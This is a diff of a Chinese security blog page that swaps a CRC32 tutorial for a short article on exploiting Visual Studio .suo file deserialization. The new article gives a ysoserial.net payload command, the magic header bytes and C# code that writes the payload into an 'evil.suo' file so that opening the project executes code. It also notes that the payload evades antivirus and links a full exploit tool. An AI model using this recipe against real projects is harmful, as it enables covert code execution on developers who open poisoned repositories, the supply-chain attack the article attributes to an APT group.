@@ -21,31 +21,27 @@
   <meta name="author" content="Brassinolide">
   <meta name="keywords" content="博客,计算机,编程,逆向工程,web安全,网络安全,技术文章,安全研究,ctf,python,c/c++">
   
-    <meta name="description" content="【考研408】CRC算法详解，并用SIMD SSE4.2实现CRC32">
+    <meta name="description" content="时隔三月，再谈Visual Studio .suo文件反序列化漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【考研408】CRC算法详解，并用SIMD SSE4.2实现CRC32">
-<meta property="og:url" content="https://crackme.net/articles/simdcrc/index.html">
+<meta property="og:title" content="时隔三月，再谈Visual Studio .suo文件反序列化漏洞">
+<meta property="og:url" content="https://crackme.net/articles/resln/index.html">
 <meta property="og:site_name" content="CrackMe.net">
-<meta property="og:description" content="【考研408】CRC算法详解，并用SIMD SSE4.2实现CRC32">
+<meta property="og:description" content="时隔三月，再谈Visual Studio .suo文件反序列化漏洞">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://crackme.net/articles/simdcrc/1.png">
-<meta property="og:image" content="https://crackme.net/articles/simdcrc/2.png">
-<meta property="og:image" content="https://crackme.net/articles/simdcrc/3.png">
-<meta property="article:published_time" content="2025-01-15T12:15:09.000Z">
-<meta property="article:modified_time" content="2025-01-15T14:14:05.994Z">
+<meta property="og:image" content="https://crackme.net/articles/resln/640.png">
+<meta property="article:published_time" content="2025-03-30T10:37:02.000Z">
+<meta property="article:modified_time" content="2025-03-30T10:39:42.876Z">
 <meta property="article:author" content="Brassinolide">
-<meta property="article:tag" content="编程">
 <meta property="article:tag" content="网络安全">
-<meta property="article:tag" content="密码学">
-<meta property="article:tag" content="考研408">
+<meta property="article:tag" content="漏洞">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://crackme.net/articles/simdcrc/1.png">
+<meta name="twitter:image" content="https://crackme.net/articles/resln/640.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>【考研408】CRC算法详解，并用SIMD SSE4.2实现CRC32 | CrackMe.net</title>
+  <title>时隔三月，再谈Visual Studio .suo文件反序列化漏洞 | CrackMe.net</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -268,7 +264,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle">【考研408】CRC算法详解，并用SIMD SSE4.2实现CRC32</span>
+            <span id="subtitle">时隔三月，再谈Visual Studio .suo文件反序列化漏洞</span>
           
         </div>
 
@@ -279,8 +275,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-01-15 20:15" pubdate>
-          2025年1月15日 晚上
+        <time datetime="2025-03-30 18:37" pubdate>
+          2025年3月30日 晚上
         </time>
       </span>
     
@@ -291,7 +287,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          657 字
+          330 字
         
       </span>
     
@@ -302,7 +298,7 @@
         
         
         
-          6 分钟
+          3 分钟
         
       </span>
     
@@ -339,12 +335,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">【考研408】CRC算法详解，并用SIMD SSE4.2实现CRC32</h1>
+            <h1 id="seo-header">时隔三月，再谈Visual Studio .suo文件反序列化漏洞</h1>
             
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2025-01-15T22:14:05+08:00
+                    本文最后更新于 2025-03-30T18:39:42+08:00
                   
                   
 
@@ -354,43 +350,22 @@
             
               <div class="markdown-body">
                 
-                <h2 id="模二运算"><a href="#模二运算" class="headerlink" title="模二运算"></a>模二运算</h2><p>CRC算法核心是模二运算，模二运算加法不进位，减法不借位，可看作异或运算</p>
-<blockquote>
-<p>&#x2F;&#x2F;不进位<br>1101 + 0001 &#x3D; 1100<br>&#x2F;&#x2F;不借位<br>1100 - 0001 &#x3D; 1101</p>
-</blockquote>
-<p><img src="/articles/simdcrc/1.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/articles/simdcrc/2.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="CRC算法"><a href="#CRC算法" class="headerlink" title="CRC算法"></a>CRC算法</h2><p>数据链路层广泛使用循环冗余码（CRC）检错技术</p>
-<p>CRC算法步骤：</p>
-<blockquote>
-<p>设原始数据为D，除数为P，多项式的阶为r，余数为R，实际发送的数据为T</p>
-<p>1.收发双方约定生成多项式G(x)（最高位和最低位必须为1）。k位位串可视为阶数为k-1的多项式的系数序列。例如，1101用多项式表示就是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>⋅</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mn>1</mn><mo>⋅</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>0</mn><mo>⋅</mo><msup><mi>x</mi><mn>1</mn></msup><mo>+</mo><mn>1</mn><mo>⋅</mo><msup><mi>x</mi><mn>0</mn></msup></mrow><annotation encoding="application/x-tex">1 \cdot x^{3} + 1 \cdot x^{2} + 0 \cdot x^{1} + 1 \cdot x^{0} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span></p>
-<p>2.发送方基于数据和G(x)，计算出冗余码，将冗余码附加到数据最后一起发送</p>
-<blockquote>
-<p>加0：G(x)有几阶就加几个0，可看作左移&lt;&lt;运算</p>
-<p>计算冗余码： <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mi>r</mi></msup><mi>D</mi><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>P</mi></mrow><annotation encoding="application/x-tex">R = (2^{r}D) mod P </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mclose">)</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span> </p>
-<p>附加冗余码： <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mi>r</mi></msup><mi>D</mi><mo stretchy="false">)</mo><mo>⨁</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">T = (2^{r}D) ⨁ R </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">⨁</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p>
-</blockquote>
-<p>3.接收方收到数据和冗余码后，通过G(x)检错</p>
-<blockquote>
-<p>如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>P</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">T mod P = 0 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>则无差错</p>
-</blockquote>
-</blockquote>
-<p>通俗一点解释就是：选择一个数，用数据模二除这个数，得到的余数就是冗余码，附加到数据最后。接收方将收到的数据模二除选择的数，余数为0则无差错</p>
-<p><strong>做个题加深理解（笑</strong></p>
-<p>【2023统考真题】甲向乙发送数据，使用CRC算法，生成多项式为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">G(x) = x^{4} + x + 1 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，则乙方接收到比特串( D )时，可以断定无错误</p>
-<p>A.101110000</p>
-<p>B.101110100</p>
-<p>C.101111000</p>
-<p>D.101111100</p>
-<p>解析：</p>
-<p>注意到：ABCD前5位都是10111，所以可断定数据部分为10111</p>
-<p>如果没有注意到：多项式的阶为4，所以冗余码占4位，那么数据就有5位，为10111</p>
-<p>根据所给多项式，可知除数为10011，算出冗余码为1100，故选D</p>
-<h2 id="SIMD-SSE4-2实现CRC32"><a href="#SIMD-SSE4-2实现CRC32" class="headerlink" title="SIMD SSE4.2实现CRC32"></a>SIMD SSE4.2实现CRC32</h2><p>SSE4.2指令集提供了四个指令用于计算CRC32，生成多项式为0x1EDC6F41</p>
-<p>第一个操作数提供初始值，累计第二个操作数的CRC32值，返回结果</p>
-<p><img src="/articles/simdcrc/3.png" srcset="/img/loading.gif" lazyload></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdint&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrin.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> <span class="hljs-title">crc32</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>* data, <span class="hljs-type">size_t</span> size, <span class="hljs-type">uint32_t</span> init_crc = <span class="hljs-number">0xffffffff</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> offset = <span class="hljs-number">0</span>; offset &lt; size;) &#123;<br>        <span class="hljs-type">size_t</span> remaining = size - offset;<br>        <span class="hljs-keyword">if</span> (remaining &gt;= <span class="hljs-number">8</span>) &#123;<br>            init_crc = _mm_crc32_u64(init_crc, *(<span class="hljs-type">uint64_t</span>*)(data + offset));<br>            offset += <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (remaining &gt;= <span class="hljs-number">4</span>) &#123;<br>            init_crc = _mm_crc32_u32(init_crc, *(<span class="hljs-type">uint32_t</span>*)(data + offset));<br>            offset += <span class="hljs-number">4</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (remaining &gt;= <span class="hljs-number">2</span>) &#123;<br>            init_crc = _mm_crc32_u16(init_crc, *(<span class="hljs-type">uint16_t</span>*)(data + offset));<br>            offset += <span class="hljs-number">2</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (remaining &gt;= <span class="hljs-number">1</span>) &#123;<br>            init_crc = _mm_crc32_u8(init_crc, *(data + offset));<br>            offset += <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> init_crc ^ <span class="hljs-number">0xffffffff</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">uint8_t</span> data[] = &#123;<span class="hljs-string">&quot;test&quot;</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> crc = <span class="hljs-built_in">crc32</span>(data, <span class="hljs-number">4</span>); <span class="hljs-comment">//0x86a072c0</span><br>&#125;<br></code></pre></td></tr></table></figure>
+                <p>2025年1月，某APT组织利用Visual Studio .suo文件反序列化漏洞投毒。</p>
+<p>微软认为，使用Visual Studio打开项目本来就是危险操作，所以他们并不认为这是漏洞，也不会修复（这回复就很微软哈哈哈），时至今日，该漏洞在最新版的Visual Studio中依然能正常利用（分项目类型，部分项目类型不生效，没深入研究）</p>
+<p>该漏洞在被APT组织利用前知名度并不高（虽然非常严重），在2023年就披露出来了，我在2024年编写了一个利用工具，到2025年才有APT组织利用</p>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>生成Payload：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ysoserial -g ClaimsIdentity -f BinaryFormatter -c calc -o base64 -bgc TypeConfuseDelegate<br></code></pre></td></tr></table></figure>
+
+<p>然后添加一个申必魔数头</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-built_in">byte</span>[] payload_header = &#123; <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> &#125;;<br></code></pre></td></tr></table></figure>
+
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/ironfede/openmcdf">openmcdf</a>将Payload写入.suo文件</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C#">cf.RootStorage.GetStream(<span class="hljs-string">&quot;VsToolboxService&quot;</span>).SetData(CombineArrays(payload_header, Convert.FromBase64String(payload)));<br><span class="hljs-built_in">string</span> o = Environment.CurrentDirectory + <span class="hljs-string">&quot;\\evil.suo&quot;</span>;<br>cf.SaveAs(o);<br>cf.Close();<br>Console.WriteLine(<span class="hljs-string">&quot;\n\n成功，文件已保存到 &quot;</span> + o);<br></code></pre></td></tr></table></figure>
+
+<p>替换原有的.suo文件，打开项目，代码执行，利用成功</p>
+<p><img src="/articles/resln/640.png" srcset="/img/loading.gif" lazyload></p>
+<p>Payload被Base64编码，而且.suo文件以二进制形式存储，也就是说这种方法自带免杀，利用起来非常方便（笑）</p>
+<p>上面的代码不完整，这里有完整利用工具（给个star吧谢谢了）：<a target="_blank" rel="noopener" href="https://github.com/Brassinolide/VS_Deserialize_Exploit">https://github.com/Brassinolide/VS_Deserialize_Exploit</a></p>
 
                 
               </div>
@@ -403,13 +378,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E7%BC%96%E7%A8%8B/" class="print-no-link">#编程</a>
-      
         <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="print-no-link">#网络安全</a>
       
-        <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" class="print-no-link">#密码学</a>
-      
-        <a href="/tags/%E8%80%83%E7%A0%94408/" class="print-no-link">#考研408</a>
+        <a href="/tags/%E6%BC%8F%E6%B4%9E/" class="print-no-link">#漏洞</a>
       
     </div>
   
@@ -421,8 +392,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>【考研408】CRC算法详解，并用SIMD SSE4.2实现CRC32</div>
-      <div>https://crackme.net/articles/simdcrc/</div>
+      <div>时隔三月，再谈Visual Studio .suo文件反序列化漏洞</div>
+      <div>https://crackme.net/articles/resln/</div>
     </div>
     <div class="license-meta">
       
@@ -434,7 +405,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年1月15日</div>
+          <div>2025年3月30日</div>
         </div>
       
       
@@ -478,18 +449,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/articles/shellcode/" title="msvc写shellcode的坑">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">msvc写shellcode的坑</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/articles/simdsha256/" title="【编程】SIMD SHA指令集加速sha256计算">
-                        <span class="hidden-mobile">【编程】SIMD SHA指令集加速sha256计算</span>
+                      <a href="/articles/noburpsuite/" title="【奇技淫巧】利用BurpSuite的证书bug阻止BurpSuite访问你的网站">
+                        <span class="hidden-mobile">【奇技淫巧】利用BurpSuite的证书bug阻止BurpSuite访问你的网站</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
